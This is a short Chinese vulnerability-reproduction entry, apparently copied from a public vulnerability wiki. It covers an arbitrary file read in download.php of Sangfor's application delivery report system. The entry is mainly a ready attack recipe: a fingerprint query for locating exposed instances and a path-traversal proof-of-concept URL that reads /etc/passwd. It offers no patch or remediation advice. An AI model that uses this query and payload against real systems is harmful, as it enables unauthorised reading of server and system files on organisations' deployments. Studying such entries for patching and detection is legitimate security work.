---
title: "深信服 应用交付报表系统 download.php 任意文件读取漏洞"
date: 2026-10-16 09:11:04
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "深信服"
tags:
  - "深信服"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

深信服 应用交付报表系统 download.php文件存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器任意文件

## 漏洞影响

```
深信服 应用交付报表系统
```

## 网络测绘

```
app="SANGFOR-应用交付报表系统"
```

## 漏洞复现

登录页面

![image-20220525144847811](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251448956.png)

验证POC

```
/report/download.php?pdf=../../../../../etc/passwd
```

![image-20220525144958637](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251449708.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
